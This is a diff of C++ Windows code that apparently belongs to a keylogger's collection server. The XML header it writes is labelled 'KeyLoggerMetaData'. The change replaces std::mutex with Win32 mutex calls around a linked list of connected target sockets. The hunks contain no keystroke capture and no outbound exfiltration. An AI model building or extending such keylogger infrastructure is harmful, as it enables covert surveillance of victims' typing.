@@ -7,7 +7,7 @@
 #include <fcntl.h>
 #include <io.h>
 
-std::mutex mu;
+HANDLE mu;
 SOCKETLIST *head;
 void Listener()
 {
@@ -85,7 +85,7 @@ void Listener()
                 strlen("<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n"),NULL,NULL);
 
 
-            mu.lock();
+            WaitForSingleObject(mu,INFINITE);
             /*
                 establish a self referential linked list,
                     A->B->C->A...
@@ -102,7 +102,7 @@ void Listener()
                 link->nextTarget=head->nextTarget;
                 head->nextTarget=link;
             }
-            mu.unlock();
+            ReleaseMutex(mu);
 
         }
 
@@ -120,8 +120,10 @@ void Handler()
 
             while(head==nullptr ||(head->target)== NULL )
                 Sleep(1);
-            link->nextTarget=head->nextTarget;
-            link->target=head->target;
+            WaitForSingleObject(mu,INFINITE);
+
+                link=head;
+            ReleaseMutex(mu);
             while((head->target)!=NULL)
             {
 
@@ -145,18 +147,18 @@ void Handler()
                     SOCKETLIST temp = *(link->nextTarget);
                    if( link->target == temp.target)
                     {
-                        mu.lock();
+                        WaitForSingleObject(mu,INFINITE);
                         head->target=0x00;
                         head->nextTarget=0x00;
-                        mu.unlock();
+                        ReleaseMutex(mu);
                     }
                     else
                     {
-                    mu.lock();
+                      WaitForSingleObject(mu,INFINITE);
                       link->target = link->nextTarget->target;
                       link->nextTarget=link->nextTarget->nextTarget;
                       head = link;
-                      mu.unlock();
+                      ReleaseMutex(mu);
                     }
 
                 }
@@ -169,6 +171,7 @@ void Handler()
 */
 int main()
 {
+    mu = CreateMutex(NULL,false,NULL);
     std::thread thread1 (Listener);
     std::thread thread2 (Handler);
     thread1.join();
